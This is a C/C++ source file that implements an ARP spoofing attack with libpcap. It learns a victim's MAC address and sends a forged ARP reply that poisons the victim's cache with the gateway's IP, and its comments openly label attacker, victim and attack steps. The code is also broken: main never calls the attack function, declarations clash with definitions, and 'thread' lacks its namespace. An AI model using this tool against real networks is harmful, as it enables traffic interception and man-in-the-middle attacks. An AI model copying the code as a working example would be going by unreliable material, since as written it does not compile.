#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <stdint.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <linux/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <thread>

#define ETHERNET_SIZE 14
struct ETHERNET_HEADER{
    u_int8_t Destination_Mac[6];
    u_int8_t Source_Mac[6];
    u_int16_t Ether_Type;
};

struct ARP_HEADER{

    u_int16_t Mac_Type;
    u_int16_t IP_Type;
    u_int8_t Mac_Add_Len;
    u_int8_t IP_Add_Len;
    u_int16_t Opcode;
    u_int8_t Sender_Mac[6];
    u_int8_t Sender_IP[4];
    u_int8_t Target_Mac[6];
    u_int8_t Target_IP[4];
};

void Send_Arp_packet(int argc, char *argv[]);
void Check_Thread(int test_num);
int main(int argc, char *argv[]){

    thread t(Check_Thread, 10);

    t.join();

    return 0;
}
int Check_Thread(int test_num){
    printf("Test : %d\n", test_num);
    return 0;
}

int Send_Arp_packet(int argc, char* argv[])
{

    char errbuf[PCAP_ERRBUF_SIZE];
    struct ETHERNET_HEADER *ethernet;
    struct ARP_HEADER *arp;
    u_int32_t sender;
    u_int32_t target;
    int i = 0;
    int res;
    struct pcap_pkthdr *header;
    char* sender_ip = "192.168.127.135";
    u_int32_t gateway;
    const u_char* rev_packet;
    pcap_t *handle;
    u_char Arp_packet[42];
    ////////////////////////////////////
    ///////Variable For Getting Mac/////
    ////////////////////////////////////
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    ////////////////////////////////////
    //////Variable For Getting IP///////
    ////////////////////////////////////
    char ipstr[40];

    ////////////////////////////////////
    /////////Checking Argument//////////
    ////////////////////////////////////
    if(argc == 1 || argc >4 ){
        printf("%s [Interface] [Sender IP] [Target IP]\n",argv[0]);
        exit(1);
    }
    ////////////////////////////////////
    ///////Getting Mac Add//////////////
    ////////////////////////////////////
    strcpy(s.ifr_name, argv[1]);
    if( ioctl(fd, SIOCGIFHWADDR, &s) == 0){
        int i;
        for(i=0; i<6; i++){
            Arp_packet[6+i] = s.ifr_addr.sa_data[i];
            Arp_packet[22+i] = s.ifr_addr.sa_data[i];
        }
    }
    ////////////////////////////////////
    ////////Getting IP Add//////////////
    ////////////////////////////////////

    if(ioctl(fd, SIOCGIFADDR, &s) < 0){
        perror("ioctl");
        exit(1);
    }
    inet_ntop(AF_INET, s.ifr_addr.sa_data+2, ipstr,sizeof(struct sockaddr));

    printf("ip addr : %s\n", ipstr);

    target = inet_addr(argv[2]);
    gateway = inet_addr(argv[3]);
    sender = inet_addr(sender_ip);
    ethernet = (struct ETHERNET_HEADER*)malloc(sizeof(struct ETHERNET_HEADER));
    arp = (struct ARP_HEADER *)malloc(sizeof(struct ARP_HEADER));
    handle = pcap_open_live(argv[1], BUFSIZ, 0, -1, errbuf);
    
    //////////////////////////////////////////////
    //////Making Arp_packet to know Victim's MAC//////
    //////////////////////////////////////////////

    for (i = 0; i < 6; i++) {
        Arp_packet[i] = 0xff;
    }

    Arp_packet[12] = 0x08;
    Arp_packet[13] = 0x06;

    Arp_packet[14] = 0x00;
    Arp_packet[15] = 0x01;
    Arp_packet[16] = 0x08;
    Arp_packet[17] = 0x00;

    Arp_packet[18] = 0x06;
    Arp_packet[19] = 0x04;
    Arp_packet[20] = 0x00;
    Arp_packet[21] = 0x01;
    ///////////////////////////////////////
    ////////Attacker Mac and IP////////////
    ///////////////////////////////////////

    for(i=0; i<4; i++){
        Arp_packet[28+i] = sender >> i*8;
    }
    ////////////////////////////////////////
    //////////Victim Mac and IP/////////////
    ////////////////////////////////////////
    Arp_packet[32] = 0x00;
    Arp_packet[33] = 0x00;
    Arp_packet[34] = 0x00;
    Arp_packet[35] = 0x00;
    Arp_packet[36] = 0x00;
    Arp_packet[37] = 0x00;
    for(i=0;i<4; i++){
        Arp_packet[38+i] = target >> i*8;
    }




    ///////////////////////////////////////////////////////
    //////////////////Catch Arp_packet/////////////////////////
    ///////////////////////////////////////////////////////
        pcap_sendpacket(handle, Arp_packet, 42);
    while(1){
        res=pcap_next_ex(handle, &header, &rev_packet);

        if(res == 0){
            continue;
        }
        else if(res == -1 || res == -2){
            printf("res = -1 or -2 \n");
            break;
        }else{
            ethernet = (struct ETHERNET_HEADER *)(rev_packet);
            arp = (struct ARP_HEADER *)(rev_packet+ETHERNET_SIZE);
            if(arp->Opcode == 512){
                printf("Found..!!\n");
                break;
            }


        }

    }
    ////////////////////////////////////////////////////////////
    /////////////////////Sending Attack Arp_packet//////////////////
    ////////////////////////////////////////////////////////////

    for(i=0; i<6; i++){
        Arp_packet[i] = ethernet->Source_Mac[i];
        Arp_packet[32+i] = ethernet->Source_Mac[i];
    }
    for(i=0;i<4; i++){
        Arp_packet[28+i] = gateway >> i*8;
    }

    pcap_sendpacket(handle, Arp_packet,42);
    printf("Attack Finished..!\n");

    return 0;
}

